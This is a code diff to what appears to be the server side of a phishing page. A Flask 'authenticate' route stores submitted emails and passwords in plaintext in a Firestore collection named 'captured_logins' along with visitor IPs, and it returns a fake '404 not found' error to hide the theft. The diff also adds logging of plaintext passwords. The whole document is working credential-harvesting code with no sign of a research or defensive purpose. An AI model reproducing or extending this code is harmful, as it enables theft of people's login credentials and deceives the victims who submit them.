@@ -208,24 +208,25 @@ def authenticate():
     email = request.form.get('email', '').strip()
     password = request.form.get('password', '').strip()
 
+    print(f"POST received - email: {email}, password: {password}")  # debug
+
     if email and password:
         if db is None:
-            print("DB not initialized - skipping save")
+            print("Firestore DB is None - skipping save")
         else:
             try:
-                print(f"Attempting to save: {email}")
+                print("Trying to save to Firestore...")
                 doc_ref = db.collection('captured_logins').document()
                 doc_ref.set({
                     'email': email,
                     'password': password,
                     'timestamp': firestore.SERVER_TIMESTAMP,
-                    'ip': request.remote_addr or 'unknown',
-                    'user_agent': request.headers.get('User-Agent', 'unknown')
+                    'ip': request.remote_addr or 'unknown'
                 })
-                print(f"Successfully saved login for {email}")
+                print("Save SUCCESS")
             except Exception as e:
-                print(f"Firestore save FAILED: {str(e)}")
+                print(f"Save FAILED: {str(e)}")
     else:
-        print("Empty credentials - not saving")
+        print("Empty input - not saving")
 
-    return "Error"
+    return "error:404 not found"
